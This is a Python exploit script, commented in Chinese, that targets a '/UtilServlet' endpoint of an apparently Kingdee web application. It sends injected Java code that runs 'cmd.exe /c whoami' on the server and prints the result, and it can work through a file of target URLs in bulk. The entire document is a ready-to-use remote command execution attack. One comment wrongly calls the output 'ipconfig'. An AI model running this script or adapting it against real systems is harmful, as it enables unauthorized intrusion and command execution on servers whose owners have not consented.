import requests
import argparse
from urllib.parse import urljoin

# 禁用 HTTPS 警告
requests.packages.urllib3.disable_warnings()

# 核心函数 - 执行远程命令
def exploit(target):
    target = f"{target}"
    vulnurl = urljoin(target, "/UtilServlet")  # 拼接目标 URL

    # 设置请求头
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
    }

    # 构造请求体中的恶意 Java 代码
    payload = {
        'operation': 'calculate',
        'value': 'BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd.exe /c whoami").getInputStream())); String line; StringBuilder b = new StringBuilder(); while((line = br.readLine()) != null) {b.append(line);} return new String(b);',
        'fieldName': 'example_field'
    }

    try:
        # 发送 POST 请求
        response = requests.post(vulnurl, headers=headers, data=payload, verify=False)

        # 输出响应内容
        if response.status_code == 200:
            print(f"请求成功: {target}")
            print("响应内容: ")
            print(response.text)  # 这里返回的应该是 `ipconfig` 命令的输出
        else:
            print(f"请求失败: {target}, 状态码: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"请求超时或连接失败: {e}")

# 主函数
def main():
    # 命令行参数解析
    banner = """ __                                                 _       _____   ___    
[  |  _                                            / \     |_   _|.'   `.  
 | | / ] .---.  _ .--.   .--.   _ .--.   .--./)   / _ \      | | /  .-.  \ 
 | '' < / /__\\[ `/'`\]/ .'`\ \[ `.-. | / /'`\;  / ___ \     | | | |   | | 
 | |`\ \| \__., | |    | \__. | | | | | \ \._//_/ /   \ \_  _| |_\  `-'  / 
[__|  \_]'.__.'[___]    '.__.' [___||__].',__`|____| |____||_____|`.___.'  
                                       ( ( __))                            

                                                                  by:TppxIi
    """
    print(banner)
    parse = argparse.ArgumentParser(description="利用 /UtilServlet 远程命令执行漏洞")
    parse.add_argument('-u', '--url', type=str, help="目标 URL")
    parse.add_argument('-f', '--file', type=str, help="包含 URL 的文件")
    args = parse.parse_args()

    url = args.url
    file = args.file
    urls = []

    # 判断是单个 URL 还是文件 URL 列表
    if url:
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        urls.append(url)
    elif file:
        with open(file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line.startswith(('http://', 'https://')):
                    line = f"http://{line}"
                urls.append(line)

    # 执行漏洞检测
    if urls:
        if url:  # 如果是单个 URL 检查
            for u in urls:
                exploit(u)
        else:  # 文件 URL 批量处理
            for u in urls:
                exploit(u)

if __name__ == '__main__':
    main()
